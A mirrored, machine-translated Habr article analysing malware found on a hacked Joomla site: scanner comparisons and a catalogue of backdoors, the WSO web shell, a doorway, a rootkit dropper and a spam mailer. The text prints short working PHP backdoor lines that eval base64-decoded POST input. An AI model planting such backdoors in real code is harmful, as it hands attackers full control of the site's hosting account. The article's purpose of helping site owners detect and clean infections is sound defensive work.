<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hacking the site and its consequences</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The times when sites were hacked for fun were almost over. In modern reality, sites are attacking for profit. Absolutely any site can attack, even wit...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hacking the site and its consequences</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/970/eac/8e5/970eac8e5447b5b276f47b69cf3a22dc.png"><br><br>  The times when sites were hacked for fun were almost over.  In modern reality, sites are attacking for profit.  Absolutely any site can attack, even with minimal indicators and traffic. <a name="habracut"></a><br><br>  Attacks to sites can be both directed when the attacked site is interesting to the attacker for certain reasons, or massive when the attacker attempts to exploit some kind of vulnerability that has become known to him in a particular CMS. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h2>  Breaking into </h2><br>  Hacking sites a lot of options.  Starting from the exploitation of vulnerabilities of the CMS system and server, to the selection of passwords or sending Trojans to retrieve saved passwords from FTP and admin panels.  Even if your site is securely protected - you can be broken through vulnerable neighbors on shared-hosting with incorrect rights set.  Attackers can monitor bugtraq-broadcasts for the emergence of various kinds of vulnerabilities.  <a href="https://ru.wikipedia.org/wiki/%25D0%25A3%25D1%258F%25D0%25B7%25D0%25B2%25D0%25B8%25D0%25BC%25D0%25BE%25D1%2581%25D1%2582%25D1%258C_%25D0%25BD%25D1%2583%25D0%25BB%25D0%25B5%25D0%25B2%25D0%25BE%25D0%25B3%25D0%25BE_%25D0%25B4%25D0%25BD%25D1%258F">zero days</a> , collect vulnerable sites with the help of search engines and services and try to massively attack. <br><br><h2>  Effects </h2><br>  Usually, malefactors, proceeding from their goals and qualifications, try to gain a foothold in the hacked resource and disguise their presence.  Hacking the site is not always possible to recognize by external signs (mobile redirect, spam links on pages, other people's banners, deface, etc.).  When the site is compromised, these external features may not be.  The resource can work in a regular mode, without interruptions, errors and getting into the "black" lists of antiviruses.  But this does not mean that the site is safe.  The problem is that it is difficult to notice the fact of hacking and downloading hacker scripts without conducting a security audit, and the web shells themselves, backdoors, and other hacker tools can be on the hosting for a long time and not be used for their intended purpose.  But once the moment comes, and they begin to be severely exploited by the attacker, causing the site owner to have problems.  For spam, phishing pages are blocked on the hosting site (or disable some of the functionality), and the appearance of redirects or viruses on the pages is fraught with a ban from antivirus programs and sanctions from search engines.  In such a case, it is necessary to urgently "cure" the site, and then put protection against hacking, so that the plot does not repeat. <br><br><h2>  Monetization </h2><br>  What can an attacker get from a hacked site?  First of all the information.  The site can have a closed section, an online store can contain a user base, the site can integrate services with hard-coded credentials of third-party systems (for example, SMS gateways with a good balance), etc. that can be sold. <br><br>  The site can be used for the extraction and sale of traffic - from the installation of seo-links, to the introduction of iframe code leading to the so-called.  <a href="https://ru.wikipedia.org/wiki/%25D0%25AD%25D0%25BA%25D1%2581%25D0%25BF%25D0%25BB%25D0%25BE%25D0%25B9%25D1%2582">exploit bundles</a> - automated systems for exploiting browser vulnerabilities, flash players, etc. <br><br><img src="https://habrastorage.org/files/054/0e9/a34/0540e9a343494564828c812c5d53a45e.png"><br><br>  Recently, more and more you can hear about the so-called targeted attacks ( <a href="https://en.wikipedia.org/wiki/Advanced_persistent_threat">advanced persistent threat</a> , APT) in which hacking sites is given not the last place.  Hacking the web is often so-called.  the entry point to the corporate network, from the web site get all the possible information to conduct an effective phishing company - analyzes the users, meta tags and service information of all possible documents contained on the site.  Also, sites can be hacked during a <a href="https://en.wikipedia.org/wiki/Watering_Hole">watering-hole</a> attack.  The attacker does not attack the company's main website (which can be perfectly protected), but related resources ‚Äî the partner's website, the labor exchange and other systems that are visited by the company's employees.  The registration data of employees of the company of interest can be extracted from these sites, as well as malicious software can be installed for attacks like <a href="https://en.wikipedia.org/wiki/Drive-by_download">drive by download</a> .  Such attacks can be ordered by unscrupulous competitors, government organizations.  Also, on hacked sites, you can install software for sending spam and other programs from the arsenal of intruders. <br><br><h2>  Often, the owners do not know about hacking </h2><br>  Unfortunately, hacker scripts are not detected by external signs or external scanners.  Therefore, neither the search engine antiviruses, nor the antivirus software installed on the computer by the webmaster on the computer, will report any site security issues.  If the scripts are located somewhere in the system directories of the site (not in the root and not in the images) or injected into existing scripts, you will not be able to notice them by chance. <br><br>  Our colleagues from <a href="http://revisium.com/">Revizium</a> , a company specializing in the treatment and protection of sites against viruses, provided an interesting case from their practice. <br><br>  As ancient wisdom says: ‚Äúforewarned is forearmed.‚Äù  In order to imagine the ‚Äúscale of disaster‚Äù when hacking, we suggest to get acquainted with the average Joomla site, which was hacked as a result of a non-targeted attack, see what hackers downloaded the site and what threat the downloaded scripts carry to the site, its owner and hosting.  The incident occurred in July 2015. <br><br><h2>  As it happens in practice </h2><br>  The site is powered by Joomla version 2.5.28.  The reason for the appeal is to block the site from the hosting side for spamming.  In addition to analyzing e-mail and web server logs, the site was scanned by three popular solutions for detecting malicious code on a hosting: <a href="http://revisium.com/ai/">AI-BOLIT</a> , <a href="https://www.rfxn.com/projects/linux-malware-detect/">Maldet</a> and <a href="http://www.clamav.net/index.html">ClamAv</a> . <br><br>  <b>AI-BOLIT</b> 's result: 206 malicious scripts: <br><br><img src="https://habrastorage.org/files/1a3/f93/bc3/1a3f93bc3eba44129c8b603f2597b439.png"><br><br>  <b>Maldet</b> result: 84 malicious files: <br><br><img src="https://habrastorage.org/files/e55/0aa/c42/e550aac425d744849099f2294c148043.png"><br><br>  ClamAv result: 67 malicious files: <br><br><img src="https://habrastorage.org/files/1af/089/8fc/1af0898fc3aa4ec8bba5391eab330e42.png"><br><br>  We also requested the original site version from the developers and compared the files using the git version control system.  According to the results of the comparison and verification of the detected files, it turned out that AI-BOLIT had overdone it a bit, that is, it detected all the malware + about 15% was ‚Äúfalse positive‚Äù (false positives).  Clamav and Maldet found only half of all malicious programs, so we can conclude that these antiviruses are suitable for express infection check, but not suitable for the ‚Äútreatment‚Äù of the site.  During the ‚Äúcure‚Äù, all malicious and hacker scripts should be detected and deleted.  If at least one backdoor or web shell remains, the site will be hacked again. <br><br>  After the analysis, we dismantled the functionality of the detected ‚Äúmalware‚Äù and classified them.  The result in the table: <br><br><img src="https://habrastorage.org/files/53b/778/1a0/53b7781a067d4a82a3612f90507673e3.png"><br><br>  In case of non-targeted hacking, patterns of infection can be traced well, that is, the presence of similar types of malicious and hacker scripts randomly scattered in the site directories or embedded in .php files.  The number of scripts of each type, their code may differ slightly with each <a href="http://revisium.com/ai/">infection of the site with viruses</a> due to obfuscation and encryption, but the functionality of each type is preserved.  By the way, from time to time a new type of backdoors is added to the pattern.  A year ago, there was no number 2 and number 5. <br><br>  This infection pattern is characteristic of Joomla CMS, Wordpress, and some commercial CMS. <br><br><h2>  Consider each script from this set. </h2><br>  <b>Number 1</b> is a backdoor that is injected (embedded) at the beginning of a random .php file.  When viewing the code, it is not immediately noticeable, since it is intentionally ‚Äúbroken off‚Äù with whitespace to the right beyond the limits of the visible part of the screen (therefore, we always turn on the ‚Äúline break‚Äù mode in the editor). <br><br><img src="https://habrastorage.org/files/805/9e8/d69/8059e8d69b2944d7b6244e87f63176df.png"><br><br>  This plain record is a challenge: <br><br><pre><code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">' n746521'</span></span>])) {<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(base64_decode($_POST[<span class="hljs-string"><span class="hljs-string">'n746521'</span></span>]));}</code> </pre> <br>  That is, arbitrary PHP code will be executed, which is encoded in base64 and transferred to the variable n746521 by the POST method.  How dangerous is the site if this fragment remains in the file?  It is very dangerous, because in fact it gives the attacker complete control over the hosting account: through it, you can execute any allowed PHP code, create or upload files to the hosting, send spam, execute database queries, and much more.  And this injection is convenient for a hacker because it is not a separate script that can be detected by logs.  Requests with malicious load can be sent to index.php or any site URL.  Therefore, this fragment needs to be cleaned from all .php files (there will be from 5 to 20 infected files).  For a fragment, the variable name in the apostrophes changes, the other fragments are fixed. <br><br>  <b>Number 2</b> is the backdoor loader. <br><br><img src="https://habrastorage.org/files/5d0/a2a/292/5d0a2a2920cd4fada172a4fa1273eaaa.png"><br><br>  It performs authentication by the passed parameter, then does one of the following: <br><ol><li>  executes the code passed in the parameter through <pre> <code class="php hljs">@<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(base64_decode($_POST[‚ÄúFFSW3525KKSfj‚Äù]))</code> </pre></li><li>  creates a file named Ffhwu22313_fff555ffsd.php, saves the contents to a file and connects it to the backdoor via @include_once, and then deletes it.  Thus, it bypasses the restriction of the eval call if, for example, it is blocked on the hosting. </li></ol><br>  If the script is simply opened in the browser, then the status 404 is returned. Page not found.  Thus, the backdoor is almost impossible to detect outside. <br><br>  As well as # 1, the backdoor allows you to get full control over the hosting account, and in consequence, perhaps the entire server.  But # 2 is more functional due to the eval bypass. <br><br>  The good news for site owners is that the backdoor is placed in a separate php script, that is, it can be seen with the naked eye, and can also be found using find ... ‚Äìmtime ... and find ... -ctime ....  File names are random sequences that are not found in the original CMS version, so it will be difficult to skip files when browsing directories. <br><br><img src="https://habrastorage.org/files/d66/4e2/171/d664e217182b4d489e3b9aa5c0430654.png"><br><br>  <b>Number 3</b> is the backdoor - ‚Äúyounger brother‚Äù of malware # 2. <br><br><img src="https://habrastorage.org/files/40c/78a/228/40c78a2288aa4ab7a87138e59962c3b1.png"><br><br>  Does the same, but does not know how to bypass the forbidden eval, that is, executes the transferred code only through <pre> <code class="php hljs">@<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>(base64_decode($_POST[<span class="hljs-string"><span class="hljs-string">'FFSW3525KKSfj'</span></span>])</code> </pre><br>  <b>Number 4</b> is the classic <a href="https://rdot.org/forum/showthread.php%3Fp%3D11829">WSO</a> web shell. <br><br><img src="https://habrastorage.org/files/549/051/d00/549051d00ea54787bacfc8b3608c77e5.png"><br><br>  A web shell is a ‚Äúfood processor‚Äù that makes hacker work comfortable on a hosting.  With WSO shell you can: <br><ol><li>  view hosting configuration; </li><li>  work with files through a convenient file manager (create, delete, edit, download, etc.); </li><li>  work with the database (change, delete data in tables and send any SQL queries); </li><li>  perform various string conversions (encode, decode string values); </li><li>  pick passwords (brute force); </li><li>  execute commands in command line mode; </li><li>  execute arbitrary PHP code; </li><li>  manage the site (for example, insert virus code into the database or javascript files) remotely and automatically. </li></ol><br><img src="https://habrastorage.org/files/60a/bb5/afe/60abb5afebda4daba935149c5b237d25.png"><br><br>  If you remove the destructive functionality, then ordinary webmasters could use this tool.  Sometimes it seems to us that the functionality of the control panels of some hosting sites is noticeably inferior to the capabilities of web shells. <br><br>  <b>Number 5</b> is a doorway that downloads content from a remote server: <br><br><img src="https://habrastorage.org/files/725/888/9fe/7258889febbc4e47aba7543fbd8cda7a.png"><br><br>  If you decrypt it a little, you can see from which IP the content is loaded and how it ‚Äúpretends‚Äù to the User Agent: <br><br><img src="https://habrastorage.org/files/fa5/dcf/d7f/fa5dcfd7fb2847c29fc6e2bf62fae831.png"><br><br>  Doorway generates thousands of black SEO pages.  Pages fall into the search index and adversely affect the search results of the site, the original pages of which are pessimized.  The site may fall under the filter or completely fly out of the search results. <br><br>  <b>Number 6</b> is a backdoor that accepts commands in the form of an encrypted PHP serialized array: <br><br><img src="https://habrastorage.org/files/8c4/a6b/bee/8c4a6bbee46d4b9fb3284491e774cdb8.png"><br><br>  Control commands can be transmitted via POST variables or COOKIE.  Backdoor supports commands: <br><ol><li>  ‚ÄúI‚Äù - give PHP version and backdoor version; </li><li>  ‚ÄúE‚Äù - execute eval ($ data [‚Äúd‚Äù]) for the code that is transmitted in the request. </li></ol><br>  Fragment of decrypted version of this backdoor: <br><br><img src="https://habrastorage.org/files/909/d53/3bb/909d533bb1384b8daf8a7e45fbfd8802.png"><br><br>  <b>Number 7</b> is another backdoor that can be placed in a separate file up to 400 bytes in size, and injected into php scripts.  It is a simplified option number 1 with the same disastrous consequences. <br><br><img src="https://habrastorage.org/files/123/40d/788/12340d788a784d80b88f8521254524b7.png"><br><br>  <b>Number 8</b> - Mayhem rootkit dropper.  This is perhaps the most dangerous "load" in this infection. <br><br><img src="https://habrastorage.org/files/416/69c/a57/41669ca5795b4eab8519148ac7c96ca9.png"><br><br>  Rootkit Mayhem is a serious malware for web servers on OS * nix, which turns the server into a combat unit of a botnet, but can work under conditions of limited privileges.  The task of this file is to generate a rootkit and load it via LD_PRELOAD.  A detailed analysis of the dropper can be viewed at the <a href="https://exploit.in/forum/pda/index.php/t81435.html">link</a> and in <a href="https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Mayhem">the Yandex report</a> . <br><br>  <b>Number 9</b> is a powerful spam mailer. <br><br><img src="https://habrastorage.org/files/52d/ce0/9f7/52dce09f79024e8796bbbb129039a9aa.png"><br><br>  Rich functionality allows you to send spam both through the standard mail () function and using the SMTP protocol through sockets.  Various letter templates, mailing lists, etc. are supported. The source code is well obfuscated.  A fragment of the third step deobfuscation looks like this: <br><br><img src="https://habrastorage.org/files/6bb/5c7/9e8/6bb5c79e87f04375891efa1b6bc2e863.png"><br><br>  <b>Number 10</b> is a dropper, the task of which is to download the executable shell file from a remote server, run it and delete it after completion.  This script usually starts hacking the site. <br><br><img src="https://habrastorage.org/files/77e/fe6/6a1/77efe66a122c4372beb2131df3807c24.png"><br><br>  The site from which the dropper loads the shell is also hacked.  In this case, it is used as a hosting for malicious code.  After a few hours, the shell file at this address is no longer available, so it is not possible to determine which code was executed at boot time. <br><br>  As you can see, there is not a single virus or redirect here, that is, after hacking, the site did not begin to distribute malicious code, redirect visitors, show banners, phishing pages did not appear, etc.  and ‚Äúfrom the outside‚Äù it was possible to notice the hacking only after a couple of months, when the doorway pages get into the search index. <br><br>  I would like to note that the example analyzed in the article is not some particularly complicated and insidious consequence of hacking the site.  On most sites hacked as a result of a non-targeted attack, about the same thing is observed.  The good news is that you now know what to deal with.  As wisdom says, ‚Äúforewarned is forearmed.‚Äù </div><p>Source: <a href="https://habr.com/ru/post/262579/">https://habr.com/ru/post/262579/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../262563/index.html">Effective video encoding in Linux with Nvidia NVENC: part 2, additional</a></li>
<li><a href="../262565/index.html">Release InfluxDB 0.9</a></li>
<li><a href="../262571/index.html">Caching in Android, Telegram for groups, improved callback, multicast, showlist and other innovations</a></li>
<li><a href="../262573/index.html">Dreams of an ideal API or how difficulties were overcome in the AdHands project</a></li>
<li><a href="../262575/index.html">Free online school of Android developers. Last days of registration</a></li>
<li><a href="../262581/index.html">Configuring a Samba file server on a corporate network</a></li>
<li><a href="../262583/index.html">HP Superdome X - a modern solution for business critical tasks</a></li>
<li><a href="../262585/index.html">Can email be rubber?</a></li>
<li><a href="../262587/index.html">Report on the last meeting of Defcon Moscow</a></li>
<li><a href="../262589/index.html">Japanese fool</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>